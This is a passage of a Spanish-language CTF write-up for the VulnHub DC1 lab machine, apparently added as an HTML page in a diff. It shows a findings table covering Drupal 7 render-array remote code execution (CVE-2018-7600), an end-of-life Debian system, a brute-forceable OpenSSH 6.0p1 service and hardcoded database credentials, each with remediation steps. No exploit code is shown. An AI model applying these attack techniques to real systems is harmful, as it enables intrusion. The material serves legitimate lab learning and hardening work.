+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Crítica 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">Un atacante puede inyectar un <code>render array</code> a través de un método <code>POST</code>, explotando una vulnerabilidad del <code>Drupal Form API</code>. Esto se debe a que no se sanitizan las solicitudes que comienzan con <code>#</code> , permitiendo ejecutar funciones PHP (Ataque de tipo <code>RCE</code>)</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<p>Para Drupal 7.0 se insta a actualizar a la versión <code>7.58 o posteriores</code>. Es la manera más viable de solucionar esta brecha de seguridad crítica.</p>
+</blockquote>
+<blockquote>
+<p>Debido a que el servicio se mantuvo en la <code>versión 7.0</code>, se deben aplicar medidas <strong>Post-Incidente</strong>, lo cual incluye: Verificar la integridad de las configuraciones de archivos como <code>.php</code>, así como limpiar el caché para eliminar cualquier rastro de posibles <code>render arrays</code> utilizados por atacantes</p>
+</blockquote>
+
+</div>
+
+
+
+<blockquote>
+<p>Debian 7</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF2</td>
+          <td style="text-align: center">Uso de componentes con vulnerabilidades conocidas</td>
+          <td style="text-align: center"><span style="background-color: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Alta 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">La versión de Debian del sistema ha llegado a su <code>End Of Life</code>, por lo que es seriamente desaconsejado debido a que puede ser afectado ante cualquier vulnerabilidad descubierta desde su <code>EOL</code></td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<p>Para la versión de Debian 7 se insta a migrar el sistema a una distribución con soporte de larga duración como <code>debian 12/13</code> o <code>Ubuntu 22.04.4 LTS</code>.</p>
+</blockquote>
+
+</div>
+
+
+
+<blockquote>
+<p>SSH 6.0p1</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF3</td>
+          <td style="text-align: center">Uso de componentes con vulnerabilidades conocidas</td>
+          <td style="text-align: center"><span style="background-color: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Alta 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">El servicio SSH es de una versión antigua, así como que permite autenticación por contraseñas, no posee un límite de  intentos, no bloquea IPs sospechosas y uno de los usuarios posee una contraseña débil, por lo que técnicas como <code>Dictionary Attack o Brute Force</code> son totalmente posibles</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<p>Para la versión 6.0p1 de <code>OpenSSH</code>, si no es posible cambiar de sistema, se insta a:</p>
+<ul>
+<li>Utilizar <code>claves SSH</code> para la autenticación de usuarios.</li>
+<li>Deshabilitar la opción <code>PermitRootLogin</code> .</li>
+<li>Habilitar <code>MaxAuthTries</code> estableciendo cantidades pequeñas de intentos .</li>
+<li>Utilizar una <code>whitelist</code> de IPs entrantes.</li>
+</ul>
+</blockquote>
+
+</div>
+
+
+
+<blockquote>
+<p>Hard-coded credentials</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF4</td>
+          <td style="text-align: center">Secretos hardcodeados</td>
+          <td style="text-align: center"><span style="background-color: #ffbb33; color: black; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Media 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">El archivo de configuración de <code>Drupal 7</code> posee credenciales harcodeadas, permitiendo al atacante realizar técnicas de movimiento lateral que afecten al sistema web y la base de datos.</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Medidas inmediatas:</p>
+<blockquote>
+<ul>
+<li>Utilizar variables de entorno del sistema o gestores de secretos.</li>
+<li>Establecer permisos restrictivos para que solo usuarios con permisos de administración puedan leerlo.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+
+  </div><div class="border-top pt-4 mt-4">
+    <p class="f5 text-bold mb-2">Share</p>
+    <div class="d-flex flex-wrap" style="gap: 0.5rem;">
+      <a href="https://twitter.com/intent/tweet?text=WriteUp%3A&#43;DC1&#43;%7C&#43;VulnHub&url=https%3A%2F%2Fmaxisfront.github.io%2Fes%2Fposts%2Fprimer_post%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+        </svg>
+        X
+      </a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmaxisfront.github.io%2Fes%2Fposts%2Fprimer_post%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"></path>
+        </svg>
+        Facebook
+      </a>
+      <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmaxisfront.github.io%2Fes%2Fposts%2Fprimer_post%2F&title=WriteUp%3A&#43;DC1&#43;%7C&#43;VulnHub" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"></path>
+        </svg>
+        LinkedIn
+      </a>
+      <a href="https://bsky.app/intent/compose?text=WriteUp%3A&#43;DC1&#43;%7C&#43;VulnHub%20https%3A%2F%2Fmaxisfront.github.io%2Fes%2Fposts%2Fprimer_post%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M3.468 1.948C5.303 3.325 7.276 6.118 8 7.616c.724-1.498 2.697-4.29 4.532-5.668C13.855.955 16 .186 16 2.632c0 .489-.28 4.105-.444 4.692-.572 2.04-2.653 2.561-4.504 2.246 3.236.551 4.06 2.375 2.281 4.2-3.376 3.464-4.852-.872-5.23-1.988-.07-.205-.103-.3-.103-.218 0-.081-.033.013-.103.218-.378 1.116-1.854 5.452-5.23 1.988-1.778-1.825-.955-3.649 2.28-4.2-1.85.315-3.93-.205-4.503-2.246C.28 6.737 0 3.12 0 2.632 0 .186 2.145.955 3.468 1.948"></path>
+        </svg>
+        Bluesky
+      </a>
+    </div>
+  </div><nav class="border-top pt-4 mt-4">
+    <div class="d-flex flex-justify-between"><span></span></div>
+  </nav>
+</article>
+          </div>
+          <div class="Layout-sidebar"><aside><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">Recent Posts</h3>
+  <ul class="list-style-none"><li class="mb-2">
+      <a href="/es/posts/primer_post/" class="Link--primary">WriteUp: DC1 | VulnHub</a><span class="color-fg-muted f6 d-block">
+        2026-03-01
+      </span></li></ul>
+</div><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">
+    <a href="/es/tags/" class="Link--primary">Tags</a>
+  </h3>
+  <div class="sidebar-collapsible d-flex flex-wrap" style="gap: 0.5rem;"
+    data-max-height="150"
+    data-view-all="/es/tags/"
+    data-label-more="Show more"
+    data-label-less="Show less"
+    data-label-view-all="View all"><a href="/es/tags/cms/" class="topic-tag">
+      cms
+    </a><a href="/es/tags/cve-2018-7600/" class="topic-tag">
+      cve-2018-7600
+    </a><a href="/es/tags/drupal/" class="topic-tag">
+      drupal
+    </a><a href="/es/tags/gftobins/" class="topic-tag">
+      gftobins
+    </a><a href="/es/tags/linux/" class="topic-tag">
+      linux
+    </a><a href="/es/tags/suid/" class="topic-tag">
+      suid
+    </a></div>
+</div>
+<div class="sidebar-module-toc"> <div class="Box Box--condensed mb-3">
+      <div class="Box-header">
+        <h3 class="Box-title">ToC</h3>
+      </div>
+      <div class="Box-body toc-sidebar">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#habilidades-empleadas">Habilidades Empleadas</a></li>
+    <li><a href="#herramientas-utilizadas">Herramientas Utilizadas</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#sa-core-2018-002--cve-2018-7600">SA-Core-2018-002 | CVE-2018-7600</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#creación-de-una-reverse-shell">Creación de una Reverse Shell</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#find-aprovechamiento-del-suid">Find: Aprovechamiento del SUID</a></li>
+    <li><a href="#impacto">Impacto</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#descubrimientos">Descubrimientos</a></li>
+  </ul>
+</nav>
+      </div>
+    </div>
+</div>
+
+</aside></div>
+        </div></div>
+    </main><footer class="color-bg-subtle border-top py-6 mt-6">
+  <div class="container-xl px-3 px-md-4 px-lg-5">
+    <div class="d-flex flex-column flex-md-row flex-justify-between flex-items-center">
+      <div class="mb-3 mb-md-0">
+        <p class="color-fg-muted mb-0">
+          &copy; 2026 MaxisFront.</p>
+      </div><nav class="d-flex flex-wrap" aria-label="Footer navigation"><a href="/privacy/" class="Link--secondary px-2">Privacy</a></nav><div class="d-flex flex-items-center"><a href="https://github.com/your-username" class="Link--secondary px-2" aria-label="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+          </svg>
+        </a><a href="https://x.com/your-username" class="Link--secondary px-2" aria-label="X">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+          </svg>
+        </a></div></div>
+
+    <p class="color-fg-muted f6 mt-4 text-center">
+      Powered by
+      <a href="https://github.com/ngs/hugo-primer-blog" class="Link--secondary">Hugo Primer Blog</a>
+    </p>
+  </div>
+</footer>
+</div><script src="/js/theme-switcher.min.7378bbae7a4bc4b974611d68fe84197c86faf4bb09e4744c2789f4bd36159a0b.js" integrity="sha256-c3i7rnpLxLl0YR1o/oQZfIb69LsJ5HRMJ4n0vTYVmgs="></script><script src="/js/sidebar.min.8d897965d82e39784b4da02d345c06f44ecdff6252fcf44c20eeb421f1027114.js" integrity="sha256-jYl5ZdguOXhLTaAtNFwG9E7N/2JS/PRMIO60IfECcRQ="></script>
+</body>
+</html>
